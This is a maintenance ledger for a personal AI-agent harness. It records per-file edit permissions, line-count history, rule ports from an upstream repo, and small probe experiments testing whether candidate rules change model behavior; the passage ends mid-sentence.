# 41 — File registry: provenance, port history, and size ledger

Split out of `40-maintenance.md` §1 on **2026-08-26**. That file was 103 lines but
6,605 words — 64 words/line against a 7–11 w/line corpus average, the only outlier
in `harness/` or `skills/`. It passed a ~200-LINE soft ceiling while carrying more
prose than any file it governs. §1 now holds the standing edit rule; this file holds
the history behind it, **verbatim**, moved by script and word-presence-checked per
skill-authoring §5's move-map rule (source backup:
`backups/harness-40-maintenance.md.2026-08-26-2231.bak`).

Line breaks were re-wrapped at ~88 chars, hyphen-safe — no word was added, removed,
reordered, or split. The wrap is the point: at one row per line this same content
read as 18 lines, which is how it slipped a line-based gate for months.

Nothing here is an order. If this file and `40-maintenance.md` §1 disagree about what
you may edit, **§1 wins** — this is the evidence layer, not the rules layer.

## `~/.claude/harness/00-DIAGNOSIS.md`

**Edit permission (authoritative copy in §1):** NO (frozen)

Historical document. Never edit. If a diagnosis becomes stale, note that in LESSONS.md,
don't rewrite history.

## `~/.claude/CLAUDE.md` (global)

**Edit permission (authoritative copy in §1):** ASK USER first

Highest blast radius — every session loads it. Exception, allowed autonomously: fixing a
factually broken pointer (file moved/renamed) — fix it, tell the user in the same turn.
**Rules killed as redundant with a global R-rule — re-test them if that R-rule is
narrowed or removed:** R3 (surgical changes) is why "stage by explicit pathspec, never
`git add -A`, over pre-existing dirty state" earns NO local line — probed 2026-07-28
across two scenarios, the second forcing a new untracked file so `-A` was the path of
least resistance, and the bare arm STILL staged narrowly both times
(`finding_probe_BC_2026-07-28.md`). That verdict is conditional on R3, not permanent; it
also says nothing about opus-pack, which has no R3 and carries the full rule in PR #87.
It is ALSO tier-bound: both scenarios ran at session tier, and a same-day haiku
replication of the companion candidate flipped 3/3 → 0/3 on the same fixture, so read
this kill as "redundant at session tier, untested at haiku".

## Project `CLAUDE.md` files

**Edit permission (authoritative copy in §1):** ASK USER first

Same rule as global.

## `10-orchestration.md`

**Edit permission (authoritative copy in §1):** YES for §0 facts

Update tool/model availability when VERIFIED changed (a probe failed / harness offers
different models). Routing-table strategy changes: ASK USER.

## `20-judgment-rubrics.md`

**Edit permission (authoritative copy in §1):** NO thresholds; YES examples

Numeric thresholds (retry cap 2, ~3× scope, 20% spot-check) changed only with user
sign-off. ADDING a good/bad example from a real session: autonomous, append-only.

## `30-delegation-templates.md`

**Edit permission (authoritative copy in §1):** YES, append-only

Add a template or a field; never delete the "report failure honestly" or edge-case
lines. Structural rewrite: ASK USER.

## `50-letter-to-future-sessions.md`

**Edit permission (authoritative copy in §1):** Handoff section only

§Handoff is a live scratch area — update freely. The letter body is frozen like the
diagnosis.

## `~/.claude/harness/LESSONS.md`

**Edit permission (authoritative copy in §1):** YES — this is YOUR file

See §3. Create it on first lesson.

## Memory files (`.../memory/*.md`)

**Edit permission (authoritative copy in §1):** YES

Existing memory rules apply (update-in-place, no duplicates, delete wrong ones).

Index-line length: the legacy debt was MIGRATED 2026-09-02 — 226 of 279 entries
across all 17 project indexes trimmed to ≤150 CHARACTERS, detail moved into the
topic files. Three lines in claude-code-technique are deliberately left over: one
is structurally impossible (its title+link prefix alone is 156 chars) and two
assert facts their global targets do not carry, so trimming them would have
destroyed the only copy. The earlier note here said "~170 over 150, four indexes";
both halves were wrong — it counted four of the seventeen indexes, and it measured
with macOS `awk`, which counts BYTES (see §4). Measure with python `len`.

## ~~`~/.claude/skills/subordinates/SKILL.md`~~ `~/.claude/skills/delegation-and-review/SKILL.md` (merged 2026-07-07)

**Edit permission (authoritative copy in §1):** YES

Process + dispatch quick-card — a CACHE over `10-orchestration.md`,
`30-delegation-templates.md` and the subordinate playbooks, not a source of truth. See
§5 write-back rule; ~~keep it ≤~150 lines~~ soft ceiling ~200 per §4 since the merge
(depth still belongs in playbooks/harness). User-approved 2026-07-07: hold past the soft
ceiling; split (§9–10 → references/) only if >~250 — EXECUTED 2026-07-11 (invocations +
trap table now in `references/invocations-and-traps.md`, SKILL.md back to ~216 lines;
re-extracted 2026-07-21 → 229 lines, new `references/long-task-handoff.md`, CRV/DS/IT
expanded — per-rule floor reached, ~35 rules at trigger+imperative+why+pointer minimum).
Same threshold applies to operational-rigor. 229→265 (#48/#55/#56/#57/#58 reverse-port)
→280 as of 2026-07-23 (added reported-FAILURE-is-a-claim + empty-output differential,
refined per opus-pack's post-#67 5-round gate; empty-output detail lives in
`references/recurring-and-settled-review.md`). Extraction still genuinely owed here —
this addition grew ON TOP of prior owed debt, not instead of it. →294 as of 2026-07-24:
opus-pack #73 (adapted from `hamanpaul/testpilot-core`, MIT ideas-only) added a genuine
§5 gap — the retry-ladder counter must track the orchestrator's own re-verification,
never a subordinate's self-reported fix — kernel in §5, full case list + why in
`references/claim-and-remedy-verification.md`. No compaction attempted this pass: §4 is
already pointer-dense (35 rules, per-rule floor per the 2026-07-21 note above) and no
bulky bullet was found to distill without cutting a live trigger — per the
floor-is-trigger-relative principle, forcing a cut here would be the phantom-debt
inversion, not real extraction. The pre-existing debt from 07-23 remains untouched and
unresolved by this pass; both are now owed together, not offset. →318 as of 2026-07-24
(PR #75, second same-day refresh): two more genuine gaps, a two-source convergence
(agent-standard-oss + curtischoutw/claude-institution, MIT ideas-only) — §1 "name the
model in the dispatch, don't let it default silently" (observable
quota/blank-inherits-ceiling signal only) and §5 "when you ARE the ceiling model, the
ladder runs downward" (ceiling-inversion, bounded by existing §1 do-it-yourself
triggers). Both folded inline, no new reference file. No compaction attempted — same
reasoning as the #73 fold above, still holds. Three PR-sized debts now owed on this file
(07-23, #73, #75), none offset. →321 as of 2026-07-25 (STALENESS FIX, not a fold — no
new rules): frontmatter model names corrected (gpt-5.5→gpt-5.6-luna, Gemini 3.5→3.6
Flash) per the playbooks that had already moved; §2 route table "agy ≥2 samples"→"one
sample" (the ≥2× variance caveat was RETIRED in `workflow_agy_subordinate.md` 2026-07-22
and the cache never learned it); §8 "opencode: strictly sequential"→"sequential by
DEFAULT" + pointer to the verified per-instance `XDG_DATA_HOME` parallel recipe. Same
three corrections applied to `references/invocations-and-traps.md` (lines 44, 47, 80)
AND to `10-orchestration.md` (lines 18, 59, 152) — the harness carried the identical
stale text, so this was a source-of-truth conflict (harness vs. playbook), not cache
drift; fixing only the cache would have let the next write-back re-infect it. →330 as of
2026-07-27 (reverse-port of opus-pack #78, merged via #84): §4 gained "a read-only
survey reports leads, not facts — confirm each in source before you spec work on it"
(fan-out finders over-claim in the size-inflating direction: substring grep counts,
"byte-identical" components that diverge on a prop, "duplicated" helpers that are
incompatible families, "dead" code with a live registry entry; each finding is a
hypothesis, first action per tier is opening the cited files, re-rank after any
scope-reversing finding). Upstream ships it `unprobed`; PROBED HERE 2026-07-27 (n=1/arm,
haiku, pre-reg `experiments/skill-cache-size-retest-2026-07-25/prereg-78-79-probe.md`):
bare ✗ (tiered all four findings as established fact, verification absent), ruled ✓
(refused to spec, named all four traps) → DISCRIMINATES, folded. Folded COMPRESSED to 10
lines (upstream is 14) and reworded from upstream's flat prohibition to "tier
provisionally if you must, but the first action in every tier is opening the cited
files" — the probe's ruled arm over-fired, refusing to produce any plan at all, which is
not the wanted behavior. 330 is 10 lines ABOVE the ~320 upper bound of the tested
no-dilution band (`finding_skill_cache_size_retest_2026-07-25`) — an accepted, recorded
risk, not a measured-safe size; the NEXT addition to this file must extract, and if
trigger-reliability ever looks degraded here, this row is the first suspect. →457 as of
2026-08-14 (reverse-port of opus-pack #174/#179, landed upstream via consolidated PR
#194, main `c2fc127`; closes part of the 8-rule debt in `project_opus_pack_fork.md`):
folded the packet-error-propagates-to-verdict bullet (#174, §4 dual-review) and the
weak-model-tool-surface bullet (#179, §2 routing). Offsetting extraction in the SAME
pass: the three handoff-compression bullets (§6, full text was inline) moved VERBATIM to
`references/long-task-handoff.md`, kernel compressed to one paragraph; the
marker-framed-packets recipe (§7) moved VERBATIM to
`references/claim-and-remedy-verification.md`, kernel compressed to one paragraph.
Word-diff artifact `delegation-and-review.reverse-port8.2026-08-14.worddiff.txt` in
`~/.claude/backups/`; every removed word traced to a surviving copy, zero missing. Both
landed rules `unprobed`.

## `~/.claude/skills/operational-rigor/SKILL.md` (+ `references/`)

**Edit permission (authoritative copy in §1):** YES wording; NO thresholds

CACHE over global CLAUDE.md R0–R8 + `20-judgment-rubrics.md`. §5 write-back applies;
numeric thresholds change only with the source (user sign-off). Split 2026-07-13 to stay
≤~250: `references/install-gate.md` (third-party/instruction-content install gate),
`references/when-stuck.md` (wrong-direction check + retry gate + mechanism replacement),
`references/external-data.md` (fail-loud data-path + clue-is-a-map),
`references/external-systems.md` (added 2026-07-14, PR#26 reverse-port: exit-code
contracts, timeout tails, cache discipline, fallback rot, timezones, deploy targets,
delete-sync traps), `references/repo-baseline.md` (extracted 2026-07-16 to make room for
two /insights-mined rules: named-target-not-found stop rule + install/upgrade HOLD verb,
latter mirrored in global CLAUDE.md same day) — main file carries a one-line pointer to
each. Re-extracted 2026-07-21 → 261 lines, then 269 after the same-day mining pass added
the scheduled-task rule — extraction owed (new `references/completion-protocol.md`; AUTH
kernel compressed — full protocol already verbatim in authorization-protocol.md;
GRILL/deploy/§5-§6 examples moved out). ~~261 is the trigger-preserving floor~~ → 276 as
of 2026-07-23 (re-extracted 285→276 after the #57 check-name rule landed; incident
detail → verification-gates.md). Floors are TRIGGER-RELATIVE, not constants: a genuinely
new trigger legitimately raises the floor — record the new floor instead of carrying
phantom "debt"; only wording/detail growth counts as debt. Next addition must extract,
not grow. →291 as of 2026-07-24 (PR #75): added §4 "tool output can itself be forged —
verify with a check whose expected shape you specified in advance," adapted from
curtischoutw/claude-institution's hard-rule #15 (MIT, ideas only), motivated by two of
their logged incidents (fabricated tool_use, injected fake "DONE" line). Folded inline
into §4, no extraction attempted — genuinely new trigger, not a rewording. →297 as of
2026-07-24 (session-mining fifth pass, local-only — NOT upstreamed): §4 gained a
one-line zsh `${PIPESTATUS[0]}` exit-code-capture trap (a bash-ism yields garbage under
zsh → false "no errors" green; re-run with explicit redirect + `echo $?`), mined from a
moira verification incident. Genuinely new trigger in §4's verify-by-execution domain;
+6 lines, no compaction (floor-is-trigger-relative). This is a local cache refinement
that deliberately did NOT go upstream (too niche/environment-specific for opus-pack), so
it introduces intentional local↔upstream divergence on this file. →373 as of 2026-08-14
(reverse-port of opus-pack #175, landed upstream via consolidated PR #195, main
`c2fc127`; closes part of the 8-rule debt in `project_opus_pack_fork.md`): folded the
lossy-channel-needs-a-hash-gate bullet into §4, beside the tool-output-can-be-forged
rule it's adjacent to. Offsetting extraction in the SAME pass: the tool-output-forged
bullet's full text (previously inline) moved VERBATIM to
`references/verification-gates.md`, kernel compressed to a pointer — genuinely new
trigger (#175) is what's inline now, not a rewording. Word-diff artifact
`operational-rigor.reverse-port8.2026-08-14.worddiff.txt` in `~/.claude/backups/`; every
removed word traced to a surviving copy, zero missing. Ships `unprobed`.

## `~/.claude/skills/ground-truth-gates/` (SKILL.md + scripts + references/)

**Edit permission (authoritative copy in §1):** YES

CACHE over the ground-truth-harness-pattern doc (claude-code-technique project). Any
edit to `scripts/` re-runs the pass AND fail probes before claiming run-verified.
`references/anonymization-map.md` (extracted 2026-07-14) holds the PII same-shape
stand-in table. Re-extracted 2026-07-21 → 229 lines (new
`references/worked-examples.md`; fake-pass-patterns.md +3 sections; scripts/
byte-identical). 239→254 as of 2026-07-23 (added reuse-time grader re-validation,
distilled from opus-pack #62, refined per the post-#67 5-round gate — per-case tracking,
invocation-shape pinning). 254 still traces every line to a live trigger; treat as the
new floor per the floor-is-trigger-relative rule, not as debt. →264 as of 2026-07-24 (PR
#75): added the "arm polarity alone doesn't prove a gate — a change detector can fake
it" clause (source-string-presence trap; decision-vs-bug test), adapted from
obra/superpowers v6.2.0's writing-good-tests rebuild (MIT, ideas only). Inline, no
extraction — new floor, not debt. NOT FOLDED 2026-07-27: opus-pack #79's rule 8 ("a gate
over hardcoded facts asserts the facts, not just the shape — anchor specific
load-bearing values from the external authority, since the cross-check that established
them happened in the conversation and evaporates"). Probed under the same
pre-registration as #78 (n=1/arm, haiku): **bare ✓** — with no gates file at all the
bare arm led with "the test suite validates the structure of the data, not its
correctness", gave the fat-fingered-date failure mode unaided, and recommended
validating against the real 2026 calendar. Ruled ✓ too, but by the frozen decision rule
a bare ✓ is NON-DISCRIMINATING as an always-loaded line here and earns no fold. Note the
local reading of "bare": subagents inherit global CLAUDE.md, whose R0 is the general
form of this rule — so the verdict is "redundant in THIS environment given R0", not a
claim the rule is worthless upstream (opus-pack has no R0). Do not re-fold without
evidence that regime changed; if R0 is ever weakened or removed, this rule becomes a
live candidate again. →272 as of 2026-07-30 (re-sync after opus-pack #89 merged via
#90): folded "a substring grader must key on a token its corpus cannot produce" into the
fake-pass list. This is a rule-layer placement of a defect found in-house 2026-07-28 (an
axis-2 grader keyed on `drift`, a word the fixture's own prose contained, and returned
PASS for all four arms including the three that recorded nothing) — the incident block
already lived in `skill-authoring/references/distilling-rules.md`, i.e. in the evidence
layer of the wrong skill, unreachable from here when building a grader. Wording follows
the merged upstream form after its fold gate, which narrowed my contributed text twice:
the match token must be a structural marker the subject must CREATE AND FILL (an empty
created marker no longer qualifies), and the damage is not "opposite to a vacuous green"
but a manufactured agreement over real input — so an A/B whose arms all pass reads as
"no effect" and retires a real rule. Ships `unprobed` here: it was probed as a grader
bug, never as a rules-file line. →462 as of 2026-08-14 (reverse-port of opus-pack
#173/#177/#178/#180, landed upstream via consolidated PR #197, main `c2fc127`; closes
part of the 8-rule debt in `project_opus_pack_fork.md`): folded 4 rules — the
block-reason-carries-check-output amendment (#173, into the recurring-invariant-hook
bullet), the downstream-observable-differential + verify-by-reconstruction pair (#177,
"Replay-gate discipline"), the wrong-entity-under-success-status bullet (#178, item 13
upstream → own bullet in "Test/gate integrity"), and the dead-source-level-assertion
fake-pass shape (#180, folded into the never-ran-coverage bullet). Offsetting extraction
in the SAME pass: verify-by-reconstruction's full text (was inline, now a pointer), the
self-benefit-metric item 11's full text, and the sentinel-fixture bullet's full text all
moved VERBATIM to `references/worked-examples.md`, `references/fake-pass-patterns.md`,
and `references/guard-design.md` respectively (move maps + word-diff artifact
`ground-truth-gates.reverse-port8.2026-08-14.worddiff.txt` in `~/.claude/backups/`;
every removed word traced to a surviving copy by script, zero missing). All 8 landed
rules `unprobed`; ships `unprobed`, per-rule notes above the fold.

## `~/.claude/skills/skill-authoring/SKILL.md` (+ `references/project-skill-templates.md`)

**Edit permission (authoritative copy in §1):** YES

CACHE over `00-DIAGNOSIS.md`, this file, and the letter's degradation modes. §5
write-back applies. `references/project-skill-templates.md` (added 2026-07-13) holds the
per-category entry-shape templates the §3 taxonomy points at. Re-extracted 2026-07-21 →
230 lines, then 241 after the same-day mining pass added three rules — extraction owed
(new `references/examples-and-cases.md` holds the GOOD/BAD pairs, incident narrations,
and the LESSONS.md template). 262→264 (#58 polarity fix) →289 as of 2026-07-23 (added
superseded-verdict-sweep, integration-PR-not-terminal, floor-is-trigger-relative — all
genuinely new triggers, refined superseded-verdict per opus-pack's post-#67 gate). →296
as of 2026-07-24: opus-pack's #71 (8-round gate on my own #68/#69) strengthened both
rules — integration-not-terminal now also checks OPEN PRs classified by changed-files
not title; floor-is-trigger-relative now gates re-baselining on a word-diff artifact +
per-line trigger check (guards the phantom-debt inversion: declaring a floor on
self-judgment). Folded WITH a same-session compaction (capability-negative bullet
trimmed, anecdote moved to examples-and-cases.md §2; full pagination/rename/3-pass
protocol moved to distilling-rules.md) — net +7 lines for +2 genuine mechanism gaps
closed, not +12 raw. Extraction is still genuinely owed on top of this — the compaction
offset this round's OWN growth, it did not touch the pre-existing debt. →320 as of
2026-07-24 (PR #75): §5 gained two rules adapted from obra/superpowers v6.2.0 (MIT,
ideas only) — "a compression cut is a falsifiable bet" (rebuttal prose can be
load-bearing under the exact pressure it rebuts; their measurement: control 8/10 →
treatment 5/10 under pressure after a "why"-only deletion) and "restructuring
probe-tuned text needs a move map" (verbatim moves + per-row disposition, not silent
paraphrase). Inline, no compaction attempted this pass — genuinely new triggers on top
of the still-unaddressed pre-#71 debt. →349 as of 2026-07-27 (reverse-port of opus-pack
#82, merged via #84 — the FIRST port from that batch; #77-80's rules into their own
caches remain owed): §4 gained "probe a candidate rule against the bare executor before
folding it in" (4-cell verdict matrix, intended-outcome scoring, armed-≠-passed, plus
the two harness traps found in-house 2026-07-27 — a scenario naming the taught
distinction inflates the bare arm, and a subagent bare arm is not bare because session
memory reaches it) and §3 gained "an invalidation clause has to hang off something the
work already touches". BOTH are the two rules of that batch that DISCRIMINATED under
their own probe (2026-07-27, n=1/arm) — deliberately ported as a pair, not as the batch
of four. NOT ported, with reasons: the world-fact-staleness-scoping rule did NOT
discriminate (bare arm produced the scoping unaided → by its own verdict table it earns
no always-loaded line here); the read-the-source/derived-file rule FAILED BOTH ARMS
upstream (its trigger named the classification it exists to force) and its repair is
pending in opus-pack PR #85 — port only after that lands, never the current upstream
form. This entry is itself the binding surface the new §3 rule demands for that pending
port. →344 as of 2026-07-27 (reverse-port of opus-pack #80, merged via #84): §2 gained
"verify-before-you-write-it bites hardest on a capability you DESCRIBE for a weaker
executor" — an unverified capability sentence is a false instruction to the reader least
able to catch it, so a scarce live session argues for verifying FIRST, not for shipping
the doc. Upstream ships it `unprobed`; PROBED HERE 2026-07-27 (n=1/arm, haiku, pre-reg
`experiments/skill-cache-size-retest-2026-07-25/prereg-80-probe.md`): bare ✗ / ruled ✓ →
DISCRIMINATES. The bare arm chose to finish the doc and justified it with the exact
excuse the rule guards — "the document didn't lie, it described the intended behavior" —
so the local form folds that rebuttal INTO the rule line ("the weaker reader cannot tell
intent from fact") rather than leaving it implicit; upstream has no such clause. THE
FILE SHRANK WHILE GAINING THE RULE: the frozen size gate forbade growing past 349, so §5
step 2's two deep bullets (compression-cut-is-a-falsifiable-bet,
restructuring-needs-a-move-map, 24 lines) were extracted VERBATIM to
`references/distilling-rules.md` §Compression and restructuring passes with a 5-line
pointer + an in-file move map — verbatim because those two are adapted from probe-tuned
external text and §5's own move-map rule forbids paraphrasing tuned prose while
relocating it. Verified: 24-line block absent from SKILL.md, byte-identical in the
reference, zero block words missing (word-diff + word-presence check, not structural
check alone). This retires part of the pre-#71 extraction debt but NOT all of it. #77
needed NO port — its rule is cross-model-review's, and that file was installed WHOLE
from `9ac61e1` (post-#77), so it arrived with the install; the earlier "#77-80 remain
owed" note in this row was over-broad. →352 as of 2026-07-28 (LOCAL fold, not a port —
the upstream form is open in opus-pack PR #87 and is WIDER than what landed here): §2
gained "a retargeted citation gets recorded in the installed file itself". Probed
locally in two rounds (pre-regs frozen before each run but LOST with the session scratch
dir — see the EVIDENCE STATUS block in `finding_probe_BC_2026-07-28.md`; this incident
is opus-pack PR #91, and the standing fix is that a pre-reg goes somewhere durable and
timestamped BEFORE the run, never a scratch path; full case block in
`references/distilling-rules.md` §Install-time citation retargets). Round 1 graded
DETECTION and returned 4/4 — a non-result. Round 2 graded the ARTIFACT on two
pre-registered axes with arms given finish authority: library-correct 3/3 bare vs 1/1
ruled (NON-discriminating), retarget-recorded **0/3 bare vs 1/1 ruled** (DISCRIMINATES).
So only the RECORD half was folded; upstream's re-resolve instruction is redundant with
model capability in this environment and survives here only as a cheap imperative inside
the kernel, not as the load-bearing claim. Wording ships `unprobed` — the shipped
sentence is a REWORDING of the probed text (a fresh-context reviewer killed the draft's
"you will re-resolve without being told": phrasing an N=3 strong-tier observation as an
assurance would affirmatively remove the instruction for the weakest reader, which §0
says is who you write for). 352 is 32 lines above the ~320 tested no-dilution band and 8
above the 344 recorded floor — accepted and recorded, not measured-safe; the next
addition to this file MUST extract. TIER DEVIATION on this probe, since CLOSED: rounds
1-2 ran at the SESSION tier, not the haiku tier every prior probe in this row used.
Round 3 (same day, pre-reg `probe-BC2/PREREG-3.md`, prediction registered before the
run) replicated axis 1 at haiku, n=3 bare: **0/3** — every arm copied the skill verbatim
with the stale `§4` citation intact, two of them reporting they had "verified the
content transferred intact" (byte-fidelity of the copy, the one check that cannot catch
an already-wrong citation). So the redundancy is TIER-BOUND: 3/3 bare at session tier,
0/3 at haiku. **Both halves of the kernel earn their line — do NOT trim the re-resolve
imperative; the earlier "redundant with model capability" note is narrowed to
strong-tier readers only.** First verdict flip on tier in this ledger: every "redundant"
verdict here inherits the tier of the arm that produced it, so read each one as "at the
tier probed", including C's row below. →365 as of 2026-07-30 (RE-SYNC of already-folded
rules after opus-pack #85-#89 merged via #90 and #91 via #93; upstream main `92077a7`).
The maintainer ran 11 adversarial fold-gate rounds (grok-4.5-high + gpt-5.6-luna-ultra +
sol-max) over my #85-89 text and 1 over #91, so the merged wording is NOT what I
contributed — three of my clauses came back changed in ways that bind here. Ported: (a)
§2 citation rule — the port-note format was numeric pairs (`original target → new
target`), which upstream now says goes stale on the next renumber, so each pair carries
its heading or named anchor and anchors get re-resolved on every re-sync instead of
replaying numbers; added the pin-the-heading-before-grepping step (a bare `§N` has no
greppable name) and the absent-here branch (delete the pointer or leave a non-resolving
gap marker, never a live `§N` that resolves to something unintended). (b) §4 probe rule
— "check the output for citations" implied the check was sufficient; upstream now denies
that, so the local line says the check bounds only QUOTED recall and a surprising
bare-pass from a memory-bearing arm stays suspect, not license; framing away from recall
now applies to BOTH arms (the candidate rule stays their only difference, else the
control confounds the probe); and the tier/baseline sentence was folded in (run both
arms at the audience tier, record the tier and what the baseline carried next to the
verdict, no bare-pass from an arm stronger than the audience licenses removing a line).
NOT ported, and NOT closable by intent: upstream's "contributing is not adopting" rule
(skill-authoring §3) is ABSENT locally — that is a new fold, so it needs its own
bare-probe before it earns an always-loaded line, and per the merged form of that very
rule this row does not close on "probe-then-port" but only on the port done or a
reasoned decline recorded. Same status for the #85 derived-file/read-the-source rule:
#85 has now MERGED, unblocking the port that the 2026-07-27 note above deferred, but
local carries no version of it at all (grep-verified 2026-07-30), so it too is a new
fold owed a probe, not a mechanical port. 365 is 45 lines above the ~320 tested
no-dilution band and 13 above the 352 accepted-risk mark; the extraction order recorded
there is now overdue and binds the next addition absolutely. **PROBED same day (pre-reg
`experiments/adoption-debt-probe-2026-07-30/PREREG.md`, prediction registered before the
run): contributing-is-not-adopting scored 3/3 bare PASS at haiku, ruled PASS →
NON-DISCRIMINATING, closed as a reasoned decline, NOT folded.** All three bare arms,
unprompted and with no version of the rule in context, recognized a just-merged upstream
rule was absent from their own always-loaded file and edited it in (verified 2026-07-30
by reading each arm's resulting file, not the self-report — all four matched). Read this
as "redundant given R0-R8 + operational-rigor's own am-I-actually-done gate" (lesson D:
the bare arm carried both), and as haiku-tier only per this ledger's own
tier-inheritance rule — no session-tier arm was run. Full caveats, including a
scenario-proximity risk (the local file sat in the same working directory as the merge,
a weaker real-world cue than files living in separate directories/machines), in
`experiments/adoption-debt-probe-2026-07-30/RESULT.md`. This closes task #26; it does
NOT resolve the standing local adoption debts themselves (blanket-go scope clause, this
rule's own incident, the #85 derived-file rule) — it means don't spend a §3 line
teaching an AI executor something haiku already does unprompted in this scenario shape.
→431 as of 2026-08-12 (dual-review extraction pass: my own read + an independent codex
review of the file, merged and adjudicated before acting — codex's "no rollback
procedure" finding was refuted, its "competing precedence rules" Critical was
downgraded, its enterprise-process cluster (version manifests, release-lint, statistical
testing ladders) declined as against the do-not-rebuild posture; both reviews agreed on
the size/TOC debt and the probe-block hazard). 441→431 despite adding a TOC and one new
rule: (a) the §4 probe-methodology block (62 lines, the file's own densest weak-reader
hazard per both reviews) extracted VERBATIM to `references/distilling-rules.md` §Probe
methodology, replaced in SKILL.md with an `unprobed` 5-step checklist kernel that
explicitly WINS-loses to the verbatim reference on dispute (reference wins) — word-diff
+ word-presence check confirmed zero words lost, not structural check alone; (b) added
TOC (file crossed 300 lines long ago, convention was unpaid); (c) rewrote the date/N
litmus in §1 — it forbade dates in rules files while the file's OWN body requires them
(version pins, port notes, SUPERSEDED markers, probe-status markers) — codex's top
verified catch; narrowed to "history-narration forbidden, operational metadata exempt
and required"; (d) added new `unprobed` rule "a description is a rule too — probe its
ROUTING" (§1, after skill-anatomy) — both reviews independently flagged the
description/triggering layer as exempt from the file's own probe covenant; this is a NEW
fold on user direction, not yet bare/ruled probed — **owed**: routing-collision probe (N
task prompts per skill, grade did-it-invoke, one prompt should fire a sibling and
shouldn't fire this one). Backups:
`~/.claude/backups/skill-authoring.SKILL.md.2026-08-12-0710.bak` (pre-pass) +
`.distilling-rules.md.2026-08-12-0710.bak`; word-diff artifact at
`skill-authoring.extraction-pass.2026-08-12.worddiff.txt`. Declined from codex's list
(recorded so they aren't silently re-proposed): per-environment support matrices, skill
version/compatibility manifests, reviewer-expiry metadata, release-lint machine checks,
graduated statistical testing ladders — all real but scaled for a team-maintained public
library, not a personal cache; the useful kernel of each (reference-integrity,
tier-scoped verdicts, red-line named reviewer) is already covered elsewhere in this
file. Debt still open: the description-routing probe above, and re-running this row's
word-diff discipline the next time §2/§3's still-dense paragraphs (citation-porting,
derived-file, capability-negative) get touched — both reviews flagged those as
compression-risk but this pass did not touch their prose, only relocated the probe
block. →439 as of 2026-08-12 (same day, fold-back from opus-pack PR #181): the
description-routing rule was upstreamed same-session (PR #181, `70bcded`, CI green,
OPEN) and gained substance under TWO pre-push fresh-context review rounds there; the
review-improved wording folded back into the local bullet: N pinned to ≥5,
close/surprising calls re-run before deciding, explicit Done (every prompt fires;
partial pass = rewrite), the name-also-routes overclaim fix (description was NOT the
"only" pre-load layer), the content-probe-can't-reach-routing mechanism sentence, a
candidate-sibling generator (author-judged shared task domain; similar wording is a flag
not the boundary), and co-fire grading (fires instead of or ALONGSIDE = collision, not a
pass — replaces the old "stealing" phrasing, deliberate drop). Local form omits
upstream's pairwise-similarity-ceiling arm (no such measured gate exists locally). Rule
remains `unprobed`; the owed routing probe is unchanged. Backup
`skill-authoring.SKILL.md.2026-08-12-fold181.bak`, word-diff artifact
`skill-authoring.fold181.2026-08-12.worddiff.txt`, unicode sweep on changed lines clean.
If #181's maintainer gate further rewrites the rule before merge, diff the merged text
against THIS fold, not the PR draft. →445 as of 2026-08-12 (same day, third touch:
routing probe DISCHARGED + one description clause fixed + probe marker updated). The
owed routing probe ran per the rule's own procedure (pre-reg frozen first:
claude-code-technique `experiments/description-routing-probe-2026-08-12/PREREG.md`;
deterministic transcript grader `grade.py`; sonnet-tier fresh-context subagents;
dual-direction grader soundness controls passed). Result: F1/F3/F4/F5 fired; BOTH
collision arms clean (skill-vetting and anthropic-skills:skill-creator each fired alone,
zero co-fire); the playbook-bloat prompt MISSED 0/2 under the original description —
mechanism: bloat trigger said "when a rules file bloats" and executors didn't map
"deploy playbook + tidy it up" onto it. Fixed by one clause: "when any of these files
bloats, needs tidying or slimming, or accumulates history" → 2/2 valid fires (one
post-fix run EXCLUDED as contaminated: the agent found the probe's own control
transcripts colocated with the fixtures and refused; re-run against an isolated fixture
copy). Verdicts are sonnet-tier and environment-bound (subagents carry memory/CLAUDE.md
— F4 even flagged the drill pattern yet still routed correctly; matches the real
consumer environment, bars any "description alone" claim). NOT a bare/ruled
discrimination probe — not owed, rule folded on user order. +6 net lines are
probe-status metadata on the existing bullet, not a new rule; the extraction order on
the next real addition still binds. Backup
`skill-authoring.SKILL.md.2026-08-12-descfix.bak`, word-diff
`skill-authoring.descfix.2026-08-12.worddiff.txt`, unicode sweep clean. Full tally +
harness lessons (dead logged-out headless CLI; hold-off tails suppress invocation;
fixture/artifact colocation leak) in that experiment dir's RESULT.md. NOTE for #181: the
description fix is LOCAL-description territory, not the PR's rule text — no upstream
action; but the probe result (bloat-phrasing miss class) is a candidate example if the
maintainer ever asks for evidence the rule catches real defects. →452 as of 2026-08-14
(on-merge duty discharged): #181 LANDED via upstream consolidated PR #196 (`cf096f5`,
KEEP-MODIFIED) — sole maintainer rewrite was the co-fire grading, ported here: collision
prompt fails when the SIBLING doesn't fire; this skill co-firing is a collision only
when its description doesn't claim the prompt's state; documented companion co-loads are
expected behavior / control cases (the old blanket "co-fire = collision" would
false-fail companion pairs — this catalog has them, e.g. this file's own description
names skill-creator as the creation companion). 2026-08-12 probe verdict unaffected
(zero co-fire either grading). Backup `skill-authoring.SKILL.md.2026-08-14-cofire.bak`,
word-diff `skill-authoring.cofire.2026-08-14.worddiff.txt`, unicode clean. →466 as of
2026-08-14 (SAME DAY, reverse-port of opus-pack #176, landed upstream via consolidated
PR #196, main `c2fc127`; closes another part of the 8-rule debt): folded the
recorded-environment-remedy-is-a-hypothesis-on-reuse bullet into §2, after the
verify-before-you-write-it capability rule it sits beside upstream. Offsetting
extraction in the SAME pass: the flip-default verdict-sweep bullet's GOOD/BAD pair +
alias-grep rationale (previously inline in §3) moved to
`references/examples-and-cases.md` §3, kernel left as a pointer; the full upstream #176
text also lives in `references/examples-and-cases.md` §2 (kernel in SKILL.md is
compressed). Word-diff artifact `skill-authoring.reverse-port8.2026-08-14.worddiff.txt`
in `~/.claude/backups/`; every removed word traced to a surviving copy, zero missing.
Ships `unprobed`.

## `~/.claude/skills/cross-model-review/SKILL.md`

**Edit permission (authoritative copy in §1):** YES wording; NO lineup

INSTALLED 2026-07-27 as a straight port of opus-pack `9ac61e1` (identical at
`upstream/main a6ff7d0`; 287→299 lines local). Doctrine only — it is deliberately NOT a
cache over anything local; the machine-specific half (which CLIs, which slugs, effort
flags, where a pin lives) stays in `workflow_codex_subordinate.md` /
`workflow_agy_subordinate.md` and must NEVER be written into this file (its own §1
forbids a hard-coded lineup, and skill-authoring §3 forbids one person's paths in
shipped text). Cross-references were RETARGETED at install because the local caches
renumber: upstream delegation-and-review §3 → local §4, upstream §4 (advice-mode) →
local §5, upstream §4 (edit-conflict/double-edit) → local §8, §7 → §7 unchanged;
upstream skill-authoring §2 AND §3 both → local §3. Two upstream anchor NAMES ("the
